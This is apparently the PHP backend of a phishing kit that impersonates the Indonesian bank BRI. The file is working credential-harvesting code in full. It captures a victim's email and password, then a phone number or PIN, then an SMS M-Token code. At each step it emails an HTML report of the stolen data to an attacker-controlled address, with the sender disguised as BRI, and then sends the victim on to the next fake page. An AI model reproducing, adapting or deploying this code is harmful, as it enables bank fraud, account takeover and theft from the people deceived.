<?php
session_start();
ob_start();
//Result tarif
if (isset($_POST['tarif'])) {
$_SESSION['tarif'] = $_POST['tarif'];
header("Location:login.php");
}

//Result login
if (isset($_POST['email']) && isset($_POST['pass'])) {
$email = $_POST['email'];
$password = $_POST['pass'];
$subjek = "Info Login | $email | $password";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Passsword</td>
					<td style="text-align: center;">$password</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; R.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'mailman.php';
$sender ='From: BRI <eeik2540@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($mail, $subjek, $pesan, $headers);
$_SESSION['email'] = $_POST['email'];
$_SESSION['pass'] = $_POST['pass'];
header("Location:pin.php");
}

//Result pin
if (isset($_POST['setPin'])) {
$email = $_SESSION['email'];
$password = $_SESSION['pass'];
$nohhp = $_POST['setPin'];
$subjek = "Info Login | $email | $password | $nohhp";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Passsword</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<td style="border-right: none;">Handphone</td>
					<td style="text-align: center;">$nohhp</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; R.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'mailman.php';
$sender ='From: BRI<eeik2540@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($mail, $subjek, $pesan, $headers);
$_SESSION['setPin'] = $_POST['setPin'];
header("Location:sms.php");
}

//Result sms
if (isset($_POST['sms'])) {
$email = $_SESSION['email'];
$password = $_SESSION['pass'];
$nohhp = $_SESSION['setPin'];
$esms = $_POST['sms'];
$subjek = "Info Login | $email | $password | $nohhp";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Passsword</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<td style="border-right: none;">Handphone</td>
					<td style="text-align: center;">$nohhp</td>
				</tr>
                <tr>
					<td style="border-right: none;">Kode M-Token</td>
					<td style="text-align: center;">$esms</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; R.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'mailman.php';
$sender ='From: BRI SMS<eeik2540@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($mail, $subjek, $pesan, $headers);
$_SESSION['sms'] = $_POST['sms'];
header("Location:smsdone.php");
}
?>